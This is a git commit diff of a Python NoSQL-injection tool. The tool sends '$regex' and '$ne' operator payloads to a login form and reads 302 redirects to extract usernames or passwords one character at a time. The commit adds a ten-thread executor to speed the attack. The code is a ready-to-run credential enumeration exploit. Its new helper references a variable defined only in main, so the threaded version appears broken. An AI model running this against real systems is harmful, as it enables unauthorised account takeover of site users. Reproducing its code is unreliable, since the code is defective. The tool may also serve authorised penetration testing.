71ae41c93405bba681834b221078f2e8404c4183
Abdullah Kareem <67718280+CyberKareem@users.noreply.github.com>
2023-08-08 23:30:55 +0300

    Update nosqli-user-pass-enum.py

--- nosqli-user-pass-enum.py
+++ nosqli-user-pass-enum.py
@@ -1,8 +1,9 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 import string
 import requests
 import argparse
 import sys
+import concurrent.futures
 from colorama import Fore
 from urllib3.util import Retry
 from requests.adapters import HTTPAdapter
@@ -36,6 +37,33 @@ def get_method(args):
 def build_payloads(characters):
     return [firstChar + char for firstChar in characters for char in characters]
 
+def process_payload(payload, url, method, enum_parameter, password_parameter, other_parameters, session):
+    para = {enum_parameter + '[$regex]': "^" + payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
+    try:
+        r = session.request(method=method, url=url, data=para, allow_redirects=False, timeout=10)
+        r.raise_for_status()
+
+        if r.status_code == 302:
+            loop = True
+            userpass = payload
+            while loop:
+                loop = False
+                for char in characters:
+                    new_payload = userpass + char
+                    para = {enum_parameter + '[$regex]': "^" + new_payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
+                    try:
+                        r = session.request(method=method, url=url, data=para, timeout=10)
+                        r.raise_for_status()
+                        if r.status_code == 302:
+                            userpass = new_payload
+                            loop = True
+                    except requests.exceptions.RequestException as e:
+                        print(Fore.RED + "Error occurred during request:", e)
+                        break
+            return userpass
+    except requests.exceptions.RequestException as e:
+        print(Fore.RED + "Error occurred during request:", e)
+
 def main():
     args = get_arguments()
     method = get_method(args)
@@ -48,67 +76,33 @@ def main():
     enum_parameter = args.ep
     other_parameters = "," + args.op if args.op else ""
 
-    # Remove special characters from the list of printable characters
     characters = ''.join(c for c in string.printable if c not in "$^&*|.+\?")
-
-    loop = True
-    final_output = []
-    count = 0
-
     payloads = build_payloads(characters)
 
-    # Create a Retry object with backoff factor and maximum retries
     retry = Retry(total=5, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
-
-    # Create a session and attach the Retry object to it
     session = requests.Session()
     adapter = HTTPAdapter(max_retries=retry)
     session.mount('http://', adapter)
 
-    for payload in payloads:
-        para = {enum_parameter + '[$regex]': "^" + payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
+    final_output = []
 
-        try:
-            r = session.request(method=method, url=url, data=para, allow_redirects=False, timeout=10)
-            r.raise_for_status()
-
-            if r.status_code == 302:
-                loop = True
-                print(Fore.GREEN + f"Pattern found that starts with '{payload[0]}'")
-                userpass = payload
-                while loop:
-                    loop = False
-                    for char in characters:
-                        new_payload = userpass + char
-                        para = {enum_parameter + '[$regex]': "^" + new_payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
-
-                        try:
-                            r = session.request(method=method, url=url, data=para, timeout=10)
-                            r.raise_for_status()
-
-                            if r.status_code == 302:
-                                print(Fore.YELLOW + f"Pattern found: {new_payload}")
-                                userpass = new_payload
-                                loop = True
-
-                        except requests.exceptions.RequestException as e:
-                            print(Fore.RED + "Error occurred during request:", e)
-                            break
-
+    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+        results = []
+        for payload in payloads:
+            results.append(executor.submit(process_payload, payload, url, method, enum_parameter, password_parameter, other_parameters, session))
+        
+        for future in concurrent.futures.as_completed(results):
+            userpass = future.result()
+            if userpass:
                 if userpass not in final_output:
                     print(Fore.GREEN + f"{enum_parameter} found: {userpass}")
                     final_output.append(userpass)
-                    count += 1
 
-        except requests.exceptions.RequestException as e:
-            print(Fore.RED + "Error occurred during request:", e)
-
-    if count == 0:
+    if not final_output:
         print(Fore.RED + f"No {enum_parameter} found")
     else:
-        print(f"\n{count} {enum_parameter}(s) found:")
+        print(f"\n{len(final_output)} {enum_parameter}(s) found:")
         print(Fore.RED + "\n".join(final_output))
 
 if __name__ == "__main__":
     main()
-
